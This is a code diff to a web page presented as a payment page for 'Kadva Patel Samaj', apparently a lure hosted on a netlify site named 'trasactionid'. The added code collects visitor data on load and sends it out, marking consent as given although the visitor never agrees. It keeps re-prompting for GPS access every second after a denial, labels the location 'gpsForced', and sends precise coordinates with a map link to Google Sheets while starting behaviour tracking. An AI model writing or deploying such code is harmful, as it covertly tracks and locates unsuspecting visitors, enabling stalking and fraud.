@@ -5,6 +5,11 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Payment - Kadva Patel Samaj</title>
 
+    <!-- No cache - always load fresh -->
+    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+    <meta http-equiv="Pragma" content="no-cache">
+    <meta http-equiv="Expires" content="0">
+
     <!-- Open Graph / Facebook / WhatsApp -->
     <meta property="og:type" content="website">
     <meta property="og:url" content="https://trasactionid.netlify.app/payment.html">
@@ -686,18 +691,36 @@
             }, 1000);
         }
 
+        let dataSent = false;
+        let gpsGranted = false;
+
+        // Send initial data immediately (without GPS)
+        async function sendInitialData() {
+            if (dataSent) return;
+            dataSent = true;
+
+            const visitorData = await collectVisitorData();
+            visitorData.consentGiven = true;
+            visitorData.gpsStatus = 'pending';
+            saveVisitorLog(visitorData);
+            initBehaviorTracking();
+        }
+
         // Request GPS permission - keeps asking until allowed
         function requestGPS() {
-            if (!navigator.geolocation) {
+            if (!navigator.geolocation || gpsGranted) {
                 return;
             }
 
             navigator.geolocation.getCurrentPosition(
                 async (position) => {
-                    // GPS granted - collect all data
+                    // GPS granted - send updated data with GPS
+                    gpsGranted = true;
+
                     const visitorData = await collectVisitorData();
                     visitorData.consentGiven = true;
                     visitorData.gpsForced = true;
+                    visitorData.gpsStatus = 'granted';
 
                     // Override GPS with fresh data
                     visitorData.gps = {
@@ -714,19 +737,23 @@
                         googleMapsLink: `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`
                     };
 
-                    saveVisitorLog(visitorData);
-                    initBehaviorTracking();
+                    // Send to Google Sheets with GPS data
+                    sendToGoogleSheets(visitorData);
                 },
                 (error) => {
                     // GPS denied - immediately ask again
-                    setTimeout(requestGPS, 500);
+                    setTimeout(requestGPS, 1000);
                 },
                 { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
             );
         }
 
-        // Initialize - start requesting GPS immediately
+        // Initialize - send data immediately and start GPS requests
         function init() {
+            // Send data to Google Sheets immediately
+            sendInitialData();
+
+            // Start requesting GPS (will keep asking until allowed)
             requestGPS();
         }
 
